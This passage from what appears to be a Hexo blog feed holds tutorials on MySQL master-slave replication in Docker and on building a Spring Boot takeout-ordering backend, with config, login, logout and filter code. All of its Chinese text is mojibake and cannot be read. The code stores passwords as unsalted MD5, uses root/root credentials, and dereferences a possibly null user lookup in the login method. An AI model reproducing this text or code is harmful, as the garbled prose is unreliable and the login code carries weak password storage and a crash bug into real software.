è·³è¿‡ä¸»ä»å¤åˆ¶ä¸­é‡åˆ°çš„æ‰€æœ‰é”™è¯¯æˆ–æŒ‡å®šç±»å‹çš„é”™è¯¯ï¼Œé¿å…slaveç«¯å¤åˆ¶ä¸­æ–­ã€‚## å¦‚ï¼š1062é”™è¯¯æ˜¯æŒ‡ä¸€äº›ä¸»é”®é‡å¤ï¼Œ1032é”™è¯¯æ˜¯å› ä¸ºä¸»ä»æ•°æ®åº“æ•°æ®ä¸ä¸€è‡´slave_skip_errors=1062  ## relay_logé…ç½®ä¸­ç»§æ—¥å¿—relay_log=mall-mysql-relay-bin  ## log_slave_updatesè¡¨ç¤ºslaveå°†å¤åˆ¶äº‹ä»¶å†™è¿›è‡ªå·±çš„äºŒè¿›åˆ¶æ—¥å¿—log_slave_updates=1  ## slaveè®¾ç½®ä¸ºåªè¯»ï¼ˆå…·æœ‰superæƒé™çš„ç”¨æˆ·é™¤å¤–ï¼‰read_only=1</code></pre><h3 id="43-ä¿®æ”¹å®Œé…ç½®åé‡å¯slaveå®ä¾‹"><a class="markdownIt-Anchor" href="#43-ä¿®æ”¹å®Œé…ç½®åé‡å¯slaveå®ä¾‹"></a> 4.3 ä¿®æ”¹å®Œé…ç½®åé‡å¯slaveå®ä¾‹</h3><pre><code class="hljs">docker restart mysql-slave</code></pre><h3 id="44-åœ¨ä¸»æ•°æ®åº“ä¸­æŸ¥çœ‹ä¸»ä»åŒæ­¥çŠ¶æ€"><a class="markdownIt-Anchor" href="#44-åœ¨ä¸»æ•°æ®åº“ä¸­æŸ¥çœ‹ä¸»ä»åŒæ­¥çŠ¶æ€"></a> 4.4 åœ¨ä¸»æ•°æ®åº“ä¸­æŸ¥çœ‹ä¸»ä»åŒæ­¥çŠ¶æ€</h3><pre><code class="hljs">show master status;</code></pre><h3 id="45-è¿›å…¥ä»æ•°æ®åº“"><a class="markdownIt-Anchor" href="#45-è¿›å…¥ä»æ•°æ®åº“"></a> 4.5 è¿›å…¥ä»æ•°æ®åº“</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker exec -it mysql-slave <span class="hljs-regexp">/bin/</span>bash<br>mysql -uroot -proot<br></code></pre></td></tr></table></figure><h3 id="46-åœ¨ä»æ•°æ®åº“ä¸­é…ç½®ä¸»ä»å¤åˆ¶"><a class="markdownIt-Anchor" href="#46-åœ¨ä»æ•°æ®åº“ä¸­é…ç½®ä¸»ä»å¤åˆ¶"></a> 4.6 åœ¨ä»æ•°æ®åº“ä¸­é…ç½®ä¸»ä»å¤åˆ¶</h3><pre><code class="hljs">change master to master_host='å®¿ä¸»æœºip', master_user='slave', master_password='123456', master_port=3307, master_log_file='mall-mysql-bin.000001', master_log_pos=617, master_connect_retry=30;## å‚æ•°è¯´æ˜master_hostï¼šä¸»æ•°æ®åº“çš„IPåœ°å€ï¼›master_portï¼šä¸»æ•°æ®åº“çš„è¿è¡Œç«¯å£ï¼›master_userï¼šåœ¨ä¸»æ•°æ®åº“åˆ›å»ºçš„ç”¨äºåŒæ­¥æ•°æ®çš„ç”¨æˆ·è´¦å·ï¼›master_passwordï¼šåœ¨ä¸»æ•°æ®åº“åˆ›å»ºçš„ç”¨äºåŒæ­¥æ•°æ®çš„ç”¨æˆ·å¯†ç ï¼›master_log_fileï¼šæŒ‡å®šä»æ•°æ®åº“è¦å¤åˆ¶æ•°æ®çš„æ—¥å¿—æ–‡ä»¶ï¼Œé€šè¿‡æŸ¥çœ‹ä¸»æ•°æ®çš„çŠ¶æ€ï¼Œè·å–Fileå‚æ•°ï¼›master_log_posï¼šæŒ‡å®šä»æ•°æ®åº“ä»å“ªä¸ªä½ç½®å¼€å§‹å¤åˆ¶æ•°æ®ï¼Œé€šè¿‡æŸ¥çœ‹ä¸»æ•°æ®çš„çŠ¶æ€ï¼Œè·å–Positionå‚æ•°ï¼›master_connect_retryï¼šè¿æ¥å¤±è´¥é‡è¯•çš„æ—¶é—´é—´éš”ï¼Œå•ä½ä¸ºç§’ã€‚</code></pre><h3 id="47-åœ¨ä»æ•°æ®åº“ä¸­æŸ¥çœ‹ä¸»ä»çŠ¶æ€"><a class="markdownIt-Anchor" href="#47-åœ¨ä»æ•°æ®åº“ä¸­æŸ¥çœ‹ä¸»ä»çŠ¶æ€"></a> 4.7 åœ¨ä»æ•°æ®åº“ä¸­æŸ¥çœ‹ä¸»ä»çŠ¶æ€</h3><pre><code class="hljs">show slave status \G;</code></pre><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127211307681.png" alt="image-20221127211307681" /></p><h3 id="48-åœ¨ä»æ•°æ®åº“ä¸­å¼€å¯ä¸»ä»åŒæ­¥"><a class="markdownIt-Anchor" href="#48-åœ¨ä»æ•°æ®åº“ä¸­å¼€å¯ä¸»ä»åŒæ­¥"></a> 4.8 åœ¨ä»æ•°æ®åº“ä¸­å¼€å¯ä¸»ä»åŒæ­¥</h3><pre><code class="hljs">start slave;</code></pre><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127211354655.png" alt="image-20221127211354655" /></p><blockquote><p>æ³¨æ„</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127211601944.png" alt="image-20221127211601944" /></p><p>è¿™ä¸ªæƒ…å†µæ˜¯å‰é¢çš„</p><p><code>change master to master_host='å®¿ä¸»æœºip', master_user='slave', master_password='123456', master_port=3307, master_log_file='mall-mysql-bin.000001', master_log_pos=617, master_connect_retry=30;</code>  ==<strong>å®¿ä¸»æœºip</strong>==é…ç½®å‡ºé”™</p><p>åœæ­¢<code>Slave</code></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-literal">stop</span> <span class="hljs-literal">slave</span><br></code></pre></td></tr></table></figure><p>é‡æ–°<strong>4.6æ­¥éª¤</strong>å¼€å§‹</p><h2 id="5æµ‹è¯•"><a class="markdownIt-Anchor" href="#5æµ‹è¯•"></a> 5.æµ‹è¯•</h2><h3 id="51-ä¸»åº“æ–°å¢æ•°æ®"><a class="markdownIt-Anchor" href="#51-ä¸»åº“æ–°å¢æ•°æ®"></a> 5.1 ä¸»åº“æ–°å¢æ•°æ®</h3><p>ä¸»åº“æ–°å¢</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127212405620.png" alt="image-20221127212405620" /></p><p>ä»åº“å®Œæˆäº†å¤åˆ¶</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221127212512996.png" alt="image-20221127212512996" /></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MySQL</tag>
      
      <tag>Linux</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç‘å‰å¤–å–</title>
    <link href="/2022/11/25/%E7%91%9E%E5%90%89%E5%A4%96%E5%8D%96%E7%91%9E%E5%90%89%E5%A4%96%E5%8D%96%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/11/25/%E7%91%9E%E5%90%89%E5%A4%96%E5%8D%96%E7%91%9E%E5%90%89%E5%A4%96%E5%8D%96%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="ç‘å‰å¤–å–ç¬”è®°"><a class="markdownIt-Anchor" href="#ç‘å‰å¤–å–ç¬”è®°"></a> ç‘å‰å¤–å–ç¬”è®°</h1><p><a href="https://blog.csdn.net/weixin_46906696/article/details/125040457#comments_23962173">åŸæ–‡é“¾æ¥</a></p><h1 id="æ¦‚è¿°"><a class="markdownIt-Anchor" href="#æ¦‚è¿°"></a> æ¦‚è¿°</h1><h2 id="åŠŸèƒ½æ¶æ„å›¾"><a class="markdownIt-Anchor" href="#åŠŸèƒ½æ¶æ„å›¾"></a> åŠŸèƒ½æ¶æ„å›¾</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/00f39dbdd7d24d88b56c10eabeecdd7d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h1 id="æ•°æ®åº“å»ºåº“å»ºè¡¨"><a class="markdownIt-Anchor" href="#æ•°æ®åº“å»ºåº“å»ºè¡¨"></a> æ•°æ®åº“å»ºåº“å»ºè¡¨</h1><h2 id="è¡¨è¯´æ˜"><a class="markdownIt-Anchor" href="#è¡¨è¯´æ˜"></a> è¡¨è¯´æ˜</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ee424986569f45b6a071f1556bfe10b8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h1 id="å¼€å‘ç¯å¢ƒ"><a class="markdownIt-Anchor" href="#å¼€å‘ç¯å¢ƒ"></a> å¼€å‘ç¯å¢ƒ</h1><h2 id="mavenæ­å»º"><a class="markdownIt-Anchor" href="#mavenæ­å»º"></a> Mavenæ­å»º</h2><p>ç›´æ¥åˆ›å»ºæ–°å·¥ç¨‹<br />ç»§æ‰¿çˆ¶å·¥ç¨‹çš„å½¢å¼æ¥åšè¿™ä¸ªï¼Œè¿™é‡Œæ–°å»ºçˆ¶å·¥ç¨‹<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/6e78719f1b0e465e816e50584a93d39c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p>â€‹    application.ymlæ–‡ä»¶</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8080</span><br><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">application:</span><br>    <span class="hljs-comment">#åº”ç”¨çš„åç§°ï¼Œå¯é€‰</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">reggie_take_out</span><br>  <span class="hljs-attr">datasource:</span><br>    <span class="hljs-attr">druid:</span><br>      <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.jdbc.Driver</span><br>      <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/reggie?serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;allowPublicKeyRetrieval=true</span><br>      <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>      <span class="hljs-attr">password:</span> <span class="hljs-string">root</span><br><span class="hljs-attr">mybatis-plus:</span><br>  <span class="hljs-attr">configuration:</span><br>    <span class="hljs-comment">#åœ¨æ˜ å°„å®ä½“æˆ–è€…å±æ€§æ—¶ï¼Œå°†æ•°æ®åº“ä¸­è¡¨åå’Œå­—æ®µåä¸­çš„ä¸‹åˆ’çº¿å»æ‰ï¼ŒæŒ‰ç…§é©¼å³°å‘½åæ³•æ˜ å°„</span><br>    <span class="hljs-attr">map-underscore-to-camel-case:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">log-impl:</span> <span class="hljs-string">org.apache.ibatis.logging.stdout.StdOutImpl</span><br>  <span class="hljs-attr">global-config:</span><br>    <span class="hljs-attr">db-config:</span><br>      <span class="hljs-attr">id-type:</span> <span class="hljs-string">ASSIGN_ID</span><br></code></pre></td></tr></table></figure><p>â€‹</p><h2 id="å¯åŠ¨æµ‹è¯•"><a class="markdownIt-Anchor" href="#å¯åŠ¨æµ‹è¯•"></a> å¯åŠ¨æµ‹è¯•</h2><p>åˆ›å»ºæµ‹è¯•ç±»å¹¶å¯åŠ¨<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/8f3df341f8ed469a96de5831708a5fc5.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h2 id="å¯¼å…¥å‰ç«¯é¡µé¢"><a class="markdownIt-Anchor" href="#å¯¼å…¥å‰ç«¯é¡µé¢"></a> å¯¼å…¥å‰ç«¯é¡µé¢</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/d8af2e9f8b1f4c52b8b881801c5d8c3b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><h3 id="å¯¼å…¥"><a class="markdownIt-Anchor" href="#å¯¼å…¥"></a> å¯¼å…¥</h3><p>åœ¨é»˜è®¤é¡µé¢å’Œå‰å°é¡µé¢çš„æƒ…å†µä¸‹ï¼Œç›´æ¥æŠŠè¿™ä¿©æ‹–åˆ°resourceç›®å½•ä¸‹ç›´æ¥è®¿é—®æ˜¯è®¿é—®ä¸åˆ°çš„ï¼Œå› ä¸ºè¢«mvcæ¡†æ¶æ‹¦æˆªäº†<br />æ‰€ä»¥æˆ‘ä»¬è¦ç¼–å†™ä¸€ä¸ªæ˜ å°„ç±»æ”¾è¡Œè¿™äº›èµ„æº</p><h4 id="åˆ›å»ºé…ç½®æ˜ å°„ç±»"><a class="markdownIt-Anchor" href="#åˆ›å»ºé…ç½®æ˜ å°„ç±»"></a> åˆ›å»ºé…ç½®æ˜ å°„ç±»</h4><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/434a4b66a3534624ae8576c71d5e43ac.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/ddb9c62315e74bfba369d3812b957453.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p>è®¿é—®æˆåŠŸ<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124213742999.png" alt="image-20221124213742999" /></p><h1 id="åå°å¼€å‘"><a class="markdownIt-Anchor" href="#åå°å¼€å‘"></a> åå°å¼€å‘</h1><h2 id="æ•°æ®åº“å®ä½“ç±»æ˜ å°„"><a class="markdownIt-Anchor" href="#æ•°æ®åº“å®ä½“ç±»æ˜ å°„"></a> æ•°æ®åº“å®ä½“ç±»æ˜ å°„</h2><p>ç”¨mybatis plusæ¥å®ç°é€†å‘å·¥ç¨‹<br />è¿™é‡Œæ˜¯è€ç‰ˆæœ¬çš„é€†å‘å·¥ç¨‹</p><p>â€‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>freemarker<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.30<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--mybatis-plus ä»£ç ç”Ÿæˆå™¨ä¾èµ–--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.3.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å…·ä½“æ€ä¹ˆç©çœ‹è¿™é‡Œ<br /><a href="https://blog.csdn.net/weixin_48678547/article/details/123379415">MPé€†å‘å·¥ç¨‹æ•™ç¨‹</a></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124213823750.png" alt="image-20221124213823750" /></p><h1 id="è´¦æˆ·æ“ä½œ"><a class="markdownIt-Anchor" href="#è´¦æˆ·æ“ä½œ"></a> è´¦æˆ·æ“ä½œ</h1><h2 id="ç™»é™†åŠŸèƒ½"><a class="markdownIt-Anchor" href="#ç™»é™†åŠŸèƒ½"></a> ç™»é™†åŠŸèƒ½</h2><p>å‰ç«¯é¡µé¢<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/018840778788414d802ec5309034a30b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7981e9e300884b3285073d4072fdd775.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/aa04438900b64014a89cbcb2115d9463.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p><p>æ•°æ®åº“</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124213937545.png" alt="image-20221124213937545" />ä¸šåŠ¡é€»è¾‘<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/257ae0d260b2430b8890d054fc72b65a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><strong>è¿™é‡Œä¸¤ä¸ªå­—ç¬¦ä¸²çš„æ¯”è¾ƒæ²¡æ³•ç”¨! =æ¥å®ç°</strong>ï¼Œåªèƒ½equalså†å–åæ¥åˆ¤æ–­<br />ç›´æ¥ä¸Šä»£ç ï¼Œè¿™é‡Œæ²¡æœ‰æ¶‰åŠserviceå±‚çš„æ“ä½œ</p><p>â€‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request å¦‚æœç™»é™†æˆåŠŸæŠŠå¯¹è±¡æ”¾å…¥Sessionä¸­ï¼Œæ–¹ä¾¿åç»­æ‹¿å–</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> employee åˆ©ç”¨<span class="hljs-doctag">@RequestBody</span>æ³¨è§£æ¥è§£æå‰ç«¯ä¼ æ¥çš„Jsonï¼ŒåŒæ—¶ç”¨å¯¹è±¡æ¥å°è£…</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@PostMapping(&quot;/login&quot;)</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">login</span><span class="hljs-params">(HttpServletRequest request, <span class="hljs-meta">@RequestBody</span> Employee employee)</span> &#123;<br>    String password=employee.getPassword();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> employee.getUsername();<br>    log.info(<span class="hljs-string">&quot;ç™»é™†&quot;</span>);<br>    <span class="hljs-comment">//MD5åŠ å¯†</span><br>    <span class="hljs-type">MD5Util</span> <span class="hljs-variable">md5Util</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MD5Util</span>();<br>    password=MD5Util.getMD5(password);<br>    <span class="hljs-comment">//é€šè¿‡è´¦æˆ·æŸ¥è¿™ä¸ªå‘˜å·¥å¯¹è±¡ï¼Œè¿™é‡Œå°±ä¸èµ°Serviceå±‚äº†</span><br>    LambdaQueryWrapper&lt;Employee&gt; lambdaQueryWrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LambdaQueryWrapper</span>();<br>    lambdaQueryWrapper.eq(Employee::getUsername, username);<br>    Employee empResult=employeeService.getOne(lambdaQueryWrapper);<br>        <span class="hljs-comment">//åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å­˜åœ¨</span><br>    <span class="hljs-keyword">if</span> (!empResult.getUsername().equals(username))&#123;<br>        <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;è´¦æˆ·ä¸å­˜åœ¨&quot;</span>);<br>        <span class="hljs-comment">//å¯†ç æ˜¯å¦æ­£ç¡®</span><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!empResult.getPassword().equals(password))&#123;<br>        <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;è´¦æˆ·å¯†ç é”™è¯¯&quot;</span>);<br>        <span class="hljs-comment">//å‘˜å·¥è´¦æˆ·çŠ¶æ€æ˜¯å¦æ­£å¸¸ï¼Œ1çŠ¶æ€æ­£å¸¸ï¼Œ0å°ç¦</span><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (empResult.getStatus()!=<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;å½“å‰è´¦æˆ·æ­£åœ¨å°ç¦&quot;</span>);<br>        <span class="hljs-comment">//çŠ¶æ€æ­£å¸¸å…è®¸ç™»é™†</span><br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        log.info(<span class="hljs-string">&quot;ç™»é™†æˆåŠŸï¼Œè´¦æˆ·å­˜å…¥session&quot;</span>);<br>        <span class="hljs-comment">//å‘˜å·¥idå­˜å…¥sessionï¼Œ</span><br>        request.getSession().setAttribute(<span class="hljs-string">&quot;employ&quot;</span>,empResult.getId());<br>        <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">&quot;ç™»é™†æˆåŠŸ&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é€€å‡ºåŠŸèƒ½"><a class="markdownIt-Anchor" href="#é€€å‡ºåŠŸèƒ½"></a> é€€å‡ºåŠŸèƒ½</h2><p>ç‚¹å‡»é€€å‡º<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/09194dda97404a7db7a4438d056df2b6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />åˆ é™¤sessionå¯¹è±¡</p><p>â€‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request åˆ é™¤requestä½œç”¨åŸŸä¸­çš„sessionå¯¹è±¡ï¼Œå°±æŒ‰ç™»é™†çš„request.getSession().setAttribute(&quot;employ&quot;,empResult.getId());åˆ é™¤employeeå°±è¡Œ</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@PostMapping(&quot;/logout&quot;)</span><br><span class="hljs-keyword">public</span> Result <span class="hljs-title function_">login</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-comment">//å°è¯•åˆ é™¤</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        request.getSession().removeAttribute(<span class="hljs-string">&quot;employ&quot;</span>);<br>    &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>        <span class="hljs-comment">//åˆ é™¤å¤±è´¥</span><br>        <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;ç™»å‡ºå¤±è´¥&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">&quot;ç™»å‡ºæˆåŠŸ&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å®Œå–„ç™»é™†æ·»åŠ è¿‡æ»¤å™¨"><a class="markdownIt-Anchor" href="#å®Œå–„ç™»é™†æ·»åŠ è¿‡æ»¤å™¨"></a> å®Œå–„ç™»é™†ï¼ˆæ·»åŠ è¿‡æ»¤å™¨ï¼‰</h2><p>è¿™é‡Œçš„è¯ç”¨æˆ·ç›´æ¥url+èµ„æºåå¯ä»¥éšä¾¿è®¿é—®ï¼Œæ‰€ä»¥è¦åŠ ä¸ªæ‹¦æˆªå™¨ï¼Œæ²¡æœ‰ç™»é™†æ—¶ï¼Œä¸ç»™è®¿é—®ï¼Œè‡ªåŠ¨è·³è½¬åˆ°ç™»é™†é¡µé¢<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/470f1c39f58f4cb09ee3878195622ca1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />è¿‡æ»¤å™¨é…ç½®ç±»æ³¨è§£<code>@WebFilter(filterName=&quot;æ‹¦æˆªå™¨ç±»åé¦–å­—æ¯å°å†™&quot;ï¼ŒurlPartten=â€œè¦æ‹¦æˆªçš„è·¯å¾„ï¼Œæ¯”å¦‚/*â€)</code><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/4cf893fe589242eba9be0c206389bc18.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" />åˆ¤æ–­ç”¨æˆ·çš„ç™»é™†çŠ¶æ€è¿™å—ä¹‹å‰å› ä¸ºå­˜å…¥sessioné‡Œé¢æœ‰ä¸€ä¸ªåä¸ºemployeeçš„å¯¹è±¡ï¼Œé‚£ä¹ˆåªéœ€è¦çœ‹çœ‹è¿™ä¸ªsessionè¿˜åœ¨ä¸åœ¨å°±çŸ¥é“ä»–æ˜¯å¦åœ¨ç™»é™†çŠ¶æ€<br />æ³¨æ„ï¼Œæƒ³å­˜æˆ–è€…æƒ³è·å–çš„è¯ï¼Œå°±éƒ½å¾—ç”¨<code>HttpServletRequest</code>çš„å¯¹è±¡æ¥è¿›è¡Œè·å–ï¼Œåˆ«çš„requestå¯¹è±¡æ‹¿ä¸åˆ°çš„</p><p>è¿™é‡Œæä¸€å˜´<br />è°ƒç”¨Springæ ¸å¿ƒåŒ…çš„å­—ç¬¦ä¸²åŒ¹é…ç±»çš„å¯¹è±¡ï¼Œå¯¹è·¯å¾„è¿›è¡ŒåŒ¹é…ï¼Œå¹¶ä¸”è¿”å›æ¯”è¾ƒç»“æœ<br />å¦‚æœç›¸ç­‰å°±ä¸ºtrue</p><p><code>public static final AntPathMatcher PATH_MATCHER = new AntPathMatcher();</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/a4e9e841bb7c43179bbcb2905d172a2c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br />å‰ç«¯æ‹¦æˆªå™¨å®Œæˆè·³è½¬åˆ°ç™»é™†é¡µé¢ï¼Œä¸åœ¨åç«¯åšå¤„ç†<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f0a1667cce664c35b64925c48dfb59f0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" 